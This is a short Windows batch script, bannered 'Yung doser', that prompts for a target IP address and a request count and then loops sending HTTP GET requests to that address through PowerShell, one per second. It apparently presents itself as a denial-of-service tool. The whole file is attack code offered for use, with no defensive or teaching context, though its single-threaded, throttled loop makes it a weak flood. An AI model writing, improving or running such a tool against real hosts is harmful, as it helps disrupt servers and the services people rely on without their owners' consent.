@echo off
chcp 65001 >nul
:banner
echo.
echo.
echo.                                       ██╗   ██╗██╗   ██╗███╗   ██╗ ██████╗ 
echo.                                       ╚██╗ ██╔╝██║   ██║████╗  ██║██╔════╝ 
echo.                                        ╚████╔╝ ██║   ██║██╔██╗ ██║██║  ███╗ doser
echo.                                         ╚██╔╝  ██║   ██║██║╚██╗██║██║   ██║
echo.                                          ██║   ╚██████╔╝██║ ╚████║╚██████╔╝
echo.                                          ╚═╝    ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝
echo.

set /p ip="Enter the IP address to target: "
set /p num_requests="Enter the number of requests to send: "

set count=0
:loop
set /a count+=1
powershell -Command "Invoke-WebRequest -Uri 'http://%ip%/' -Method Get -OutFile nul -ErrorAction SilentlyContinue"
if %ERRORLEVEL% neq 0 (
    echo Error: Unable to connect to the remote server.
    pause
    exit /b 1
)
echo Request %count% sent.
timeout /t 1 > nul
if %count% lss %num_requests% goto loop
echo Done!
pause